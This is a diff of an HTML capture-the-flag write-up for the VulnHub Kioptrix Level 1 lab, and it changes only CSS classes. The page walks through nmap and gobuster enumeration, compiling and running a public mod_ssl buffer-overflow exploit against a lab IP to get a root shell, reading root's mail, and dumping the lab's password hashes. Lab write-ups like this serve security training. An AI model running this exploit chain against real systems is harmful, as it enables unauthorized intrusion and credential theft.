@@ -27,16 +27,16 @@
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
     <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
-<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
-<p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix1/machinescli.png.webp" /></p>
+<p class="nested active">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix1/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
-<p class="nested">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
-<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix1/killchain.png.webp" /></p>
+<p class="nested active">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix1/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
-<p class="nested">1. <code>443/tcp/ssl/https/Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code>: <a href="https://github.com/7h3rAm/writeups#exploit_modssl">exploit_modssl</a>, <a href="https://github.com/7h3rAm/writeups#privesc_modssl">privesc_modssl</a>  </p>
+<p class="nested active">1. <code>443/tcp/ssl/https/Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code>: <a href="https://github.com/7h3rAm/writeups#exploit_modssl">exploit_modssl</a>, <a href="https://github.com/7h3rAm/writeups#privesc_modssl">privesc_modssl</a>  </p>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
-<p class="nested">1. Here's the Nmap scan result:  </p>
-<pre class="nested"><code># Nmap 7.70 scan initiated Fri Sep 27 15:42:00 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/xml/_quick_tcp_nmap.xml 192.168.92.181
+<p class="nested active">1. Here's the Nmap scan result:  </p>
+<pre class="nested active"><code># Nmap 7.70 scan initiated Fri Sep 27 15:42:00 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/xml/_quick_tcp_nmap.xml 192.168.92.181
 Nmap scan report for 192.168.92.181
 Host is up, received arp-response (0.0011s latency).
 Scanned at 2019-09-27 15:42:01 PDT for 273s
@@ -114,24 +114,24 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Sep 27 15:46:34 2019 -- 1 IP address (1 host up) scanned in 274.07 seconds
 </code></pre>
-<p class="nested">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
-<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_kioptrix1/openports.png.webp" />  </p>
-<p class="nested">3. We explore the various directories and files found with <code>gobuster</code> scan but nothing interesting is found:  </p>
-<pre class="nested"><code>gobuster -u http://192.168.92.181:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s &quot;200,204,301,302,307,401,403&quot; -x &quot;txt,html,php,asp,aspx,jsp&quot;
+<p class="nested active">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p class="nested active"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_kioptrix1/openports.png.webp" />  </p>
+<p class="nested active">3. We explore the various directories and files found with <code>gobuster</code> scan but nothing interesting is found:  </p>
+<pre class="nested active"><code>gobuster -u http://192.168.92.181:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s &quot;200,204,301,302,307,401,403&quot; -x &quot;txt,html,php,asp,aspx,jsp&quot;
   http://192.168.92.181:80/index.html (Status: 200) [Size: 2890]
   http://192.168.92.181:80/manual (Status: 301)
   http://192.168.92.181:80/mrtg (Status: 301)
   http://192.168.92.181:80/test.php (Status: 200) [Size: 27]
   http://192.168.92.181:80/usage (Status: 301)
 </code></pre>
-<p class="nested">4. We fallback on Nmap version detection for <code>443/tcp</code> and search exploits for <code>Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code> using <code>searchsploit</code>:  </p>
-<pre class="nested"><code>searchsploit mod_ssl
+<p class="nested active">4. We fallback on Nmap version detection for <code>443/tcp</code> and search exploits for <code>Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code> using <code>searchsploit</code>:  </p>
+<pre class="nested active"><code>searchsploit mod_ssl
   Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)  | exploits/unix/remote/47080.c
 </code></pre>
-<p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot01.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot01.png.webp" />  </p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
 <h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
-<pre class="nested"><code>22/tcp    |  ssh          |  OpenSSH 2.9p2 (protocol 1.99)
+<pre class="nested active"><code>22/tcp    |  ssh          |  OpenSSH 2.9p2 (protocol 1.99)
 80/tcp    |  http         |  Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
 111/tcp   |  rpcbind      |  2 (RPC #100000)
 137/udp   |  netbios-ns   |  Samba nmbd netbios-ns (workgroup: MYGROUP)
@@ -140,21 +140,21 @@ Service detection performed. Please report any incorrect results at https://nmap
 1024/tcp  |  status       |  1 (RPC #100024)
 </code></pre>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
-<p class="nested">1. We compile this exploit and check it's usage options. It requries a platform specific offset and provides mapping of supported offsets. We determine the required offset value for our target to be <code>0x6b</code> based on the Nmap version detection results for <code>443/tcp</code>. Once executed, the exploit successfully establishes an elevated, remote session with the target:  </p>
-<pre class="nested"><code>gcc -o 47080 47080.c -lcrypto
+<p class="nested active">1. We compile this exploit and check it's usage options. It requries a platform specific offset and provides mapping of supported offsets. We determine the required offset value for our target to be <code>0x6b</code> based on the Nmap version detection results for <code>443/tcp</code>. Once executed, the exploit successfully establishes an elevated, remote session with the target:  </p>
+<pre class="nested active"><code>gcc -o 47080 47080.c -lcrypto
 ./47080
   0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
 ./47080 0x6b 192.168.92.181 443
 </code></pre>
-<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot02.png.webp" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix1/screenshot03.png.webp" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_kioptrix1/screenshot04.png.webp" />  </p>
-<p class="nested">2. We can now read the <code>/var/mail/root</code> file to complete the challenge:  </p>
-<pre class="nested"><code>cat /var/mail/root
+<p class="nested active"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot02.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix1/screenshot03.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_kioptrix1/screenshot04.png.webp" />  </p>
+<p class="nested active">2. We can now read the <code>/var/mail/root</code> file to complete the challenge:  </p>
+<pre class="nested active"><code>cat /var/mail/root
 </code></pre>
-<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot05.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot05.png.webp" />  </p>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<pre class="nested"><code>root@kioptrix.level1&gt; id
+<pre class="nested active"><code>root@kioptrix.level1&gt; id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 root@kioptrix.level1&gt;  
 root@kioptrix.level1&gt; uname
@@ -175,12 +175,12 @@ root
 </code></pre>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<pre class="nested"><code>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:............
+<pre class="nested active"><code>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:............
 john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:............
 harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:............
 </code></pre>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
-<ul class="nested">
+<ul class="nested active">
 <li><a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a>  </li>
 <li><a href="https://medium.com/@bondo.mike/vulnhub-kioptrix-level-1-d439aa7039b2">https://medium.com/@bondo.mike/vulnhub-kioptrix-level-1-d439aa7039b2</a>  </li>
 <li><a href="https://n0tty.github.io/2017/02/25/kioptrix-1/">https://n0tty.github.io/2017/02/25/kioptrix-1/</a>  </li>
